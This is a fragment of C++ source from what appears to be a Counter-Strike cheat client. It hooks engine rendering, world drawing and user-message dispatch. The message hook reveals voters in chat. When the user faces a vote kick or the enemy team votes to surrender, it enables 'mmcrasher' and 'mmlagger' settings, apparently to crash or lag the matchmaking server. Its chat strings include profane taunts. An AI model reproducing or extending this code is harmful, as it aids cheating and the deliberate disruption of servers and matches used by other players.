        interfaces->studioRender->drawModelArray(*pInfo, nModelTypeCount, rdArray.Base(), sizeof(ModelRenderSystem::RenderModelInfo_t), nFlags);
        // Hook this then Render each weapon individually?


        interfaces->studioRender->forcedMaterialOverride(NULL);

    }
    else if (renderMode == ModelRenderSystem::MODEL_RENDER_MODE_SHADOW_DEPTH)
    {

        /* I need to call Original here*/
        // NOTE: Use this path because we can aggregate draw calls across mdls

        const int nFlags = STUDIORENDER_SHADOWDEPTHTEXTURE | STUDIORENDER_DRAW_OPAQUE_ONLY;
        //CMatRenderData< StudioArrayData_t > rdShadow(m_pRenderContext, nModelTypeCount);
        for (int i = 0; i < nModelTypeCount; ++i)
        {
            ModelRenderSystem::ModelListByType_t& list = pModelList[i];
            rdShadow[i].m_pStudioHdr = list.m_pStudioHdr;
            rdShadow[i].m_pHardwareData = list.m_pHardwareData;
            rdShadow[i].m_pInstanceData = list.m_pRenderModels;
            rdShadow[i].m_nCount = list.m_nCount;
        }
        //interfaces->studioRender->drawModelShadowArray(*pInfo, nModelTypeCount, rdShadow.Base(), sizeof(RenderModelInfo_t), nFlags);
    }
    else if (renderMode == ModelRenderSystem::MODEL_RENDER_MODE_RTT_SHADOWS)
    {



        // shouldn't get here unless the code is ported from l4d2 to drive this properly.
        //Assert(0);
#if 0
        // HACK: Assume all models in this batch use the same material. This only works because we submit batches of 1 model from the client shadow manager at the moment
        IMaterial* pShadowDrawMaterial = pModelList[0].m_pFirstNode->m_Entry.m_pRenderable->GetShadowDrawMaterial();
        g_pStudioRender->ForcedMaterialOverride(pShadowDrawMaterial ? pShadowDrawMaterial : m_ShadowBuild, OVERRIDE_BUILD_SHADOWS);

        for (int i = 0; i < nModelTypeCount; ++i)
        {
            ModelListByType_t& list = pModelList[i];
            g_pStudioRender->DrawModelArray(list, list.m_nCount, list.m_pRenderModels, sizeof(RenderModelInfo_t), STUDIORENDER_DRAW_OPAQUE_ONLY);
        }

        g_pStudioRender->ForcedMaterialOverride(NULL);
#endif
    }
#endif
}













typedef void(__thiscall* DrawWorldFunc)(void*, int, int*);
void __fastcall ClientHooks::DrawWorld(void* _this, void* edx, int waterZAdjust, int* pRenderContext) noexcept {
    if (config->debug.HardMode)
        return;


    ((DrawWorldFunc)oDrawWorld)(_this, waterZAdjust, pRenderContext);
    return;


}




bool __fastcall ClientHooks::DispatchUserMessage(void* _this, void* edx, int nType, unsigned int nPassthroughFlags, unsigned int nSize, const void* pData)
{
#ifdef DEV_SECRET_BUILD
#if 0
#ifdef PREVENT_OUR_RCE




#endif
#endif
#endif
    bool bSendChatMessage = false;
    char buffer[4096];
    if (nType == CS_UM_VoteStart) {

        CCSUsrMsg_VoteStart Vote;
        Vote.ParseFromArray(pData, nSize);

        Debug::QuickPrint(Vote.DebugString().c_str());

        if (Vote.vote_type() == VOTEISSUE_KICK) {
            Entity* pCaller{ nullptr };
            Entity* pVictim{ nullptr };
            pCaller = interfaces->entityList->getEntity(Vote.ent_idx());
            pVictim = interfaces->entityList->getEntity(Vote.entidx_target());

            if (pCaller && pVictim) {
                const char* color = GreenChat;
                if(pCaller->isOtherEnemy(localPlayer.get()))
                    color = RedChat;

                ((ChatPrintFFn)memory->ChatPrintf)(((ClientModeShared*)memory->clientMode)->m_pChatElement, 0, 0, 0, "[%sVoteReveal%s] %s%s%s Voted To Kick %s%s%s\n", color, WhiteChat, PurpleChat, pCaller->getPlayerName(false).c_str(), WhiteChat, PurpleChat, pVictim->getPlayerName(false).c_str(), WhiteChat);
                bSendChatMessage = true;
            }
            
            if (Vote.entidx_target() == localPlayer->index()) {
                if (config->mmcrasher.antiVoteKick) {
                    ((ChatPrintFFn)memory->ChatPrintf)(((ClientModeShared*)memory->clientMode)->m_pChatElement, 0, 0, 0, "[%sAnti-VoteKick%s] %sKICKIN IN THE MAKER, FUCKO TRIED TO KICK US!%s\n", RedChat, WhiteChat, RedChat, WhiteChat);
                    config->mmlagger.shouldLag = false;
                    config->mmcrasher.cooldownMaker = true;
                }
            }
        } else if (Vote.vote_type() == VOTEISSUE_SURRENDER) {

            Entity* pCaller = interfaces->entityList->getEntity(Vote.ent_idx());
            if (pCaller && config->mmcrasher.antiSurrender) {
                const char* color = GreenChat;
                if (pCaller->isOtherEnemy(localPlayer.get())) {
                    ((ChatPrintFFn)memory->ChatPrintf)(((ClientModeShared*)memory->clientMode)->m_pChatElement, 0, 0, 0, "[%sAnti-Surrender%s] %sKICKIN IN THE MAKER, OTHER TEAM TRIED TO SURRENDER%s\n", RedChat, WhiteChat, RedChat, WhiteChat);
                    config->mmlagger.shouldLag = false;
                    config->mmcrasher.cooldownMaker = true;
                    color = RedChat;
                }
            
            ((ChatPrintFFn)memory->ChatPrintf)(((ClientModeShared*)memory->clientMode)->m_pChatElement, 0, 0, 0, "[%sVoteReveal%s] %s%s%s Voted To Surrender\n", color, WhiteChat, PurpleChat, pCaller->getPlayerName(false).c_str(), WhiteChat);
            }
        }
        else if (Vote.vote_type() == VOTEISSUE_STARTTIMEOUT) {
            Entity* pCaller = interfaces->entityList->getEntity(Vote.ent_idx());
            const char* color = GreenChat;
            if (pCaller->isOtherEnemy(localPlayer.get()))
                color = RedChat;
            ((ChatPrintFFn)memory->ChatPrintf)(((ClientModeShared*)memory->clientMode)->m_pChatElement, 0, 0, 0, "[%sVoteReveal%s] %s%s%s Voted For A Timeout\n", color, WhiteChat, PurpleChat, pCaller->getPlayerName(false).c_str(), WhiteChat);
        }
    }
    else if (nType == CS_UM_VoteFailed) {
        ((ChatPrintFFn)memory->ChatPrintf)(((ClientModeShared*)memory->clientMode)->m_pChatElement, 0, 0, 0, "[%sVoteReveal%s] Vote %sFailed%s\n", GoldChat, WhiteChat, RedChat, WhiteChat);
    }
    else if (nType == CS_UM_VotePass) {
        ((ChatPrintFFn)memory->ChatPrintf)(((ClientModeShared*)memory->clientMode)->m_pChatElement, 0, 0, 0, "[%sVoteReveal%s] Vote %Passed%s\n", GoldChat, WhiteChat, GreenChat, WhiteChat);
    }
    else if (nType == CS_UM_SayText2) {
        CCSUsrMsg_SayText2 Text;
        Text.ParseFromArray(pData, nSize);

        memory->conColorMsg({ 255,0,255,255 }, Text.DebugString().c_str());


    }
    else if (false && (nType == CS_UM_TextMsg))
    {
        CCSUsrMsg_TextMsg TextMsg;
        TextMsg.ParseFromArray(pData, nSize);

        if (TextMsg.params().size() > 0)
        {
            if (strstr((const char*)TextMsg.params().Get(0).c_str(), "[vel"))
            {
                CON("Player Perf: %d \n", TextMsg.params().size());
                for (auto Params : TextMsg.params())
                {
                    VCON("\n%s\n", Params.c_str());
                }

            }
            else
            {
                CON("Other Text Message: \n");
                for (auto Params : TextMsg.params())
                {
                    VCON("\n%s\n", Params.c_str());
                }
            }
        }
    }






    if (bSendChatMessage) {
#if 0 // Fucking allocator....
        CCSUsrMsg_SayText2 Msg;
        Msg.set_chat(1);
        Msg.set_textallchat(1);
        Msg.set_ent_idx(localPlayer->index());
        Msg.set_msg_name(buffer, 4096);

        char* pProtoBuffer = new char[4096];
        Msg.SerializeToArray(pProtoBuffer, 4096);
        hooks->client.callOriginal<bool, 38, int, unsigned int, unsigned int, const void*>(CS_UM_SayText2, 0, Msg.ByteSize(), pProtoBuffer);
#endif
    }


    return hooks->client.callOriginal<bool, 38, int, unsigned int, unsigned int, const void*>(nType, nPassthroughFlags, nSize, pData);

}

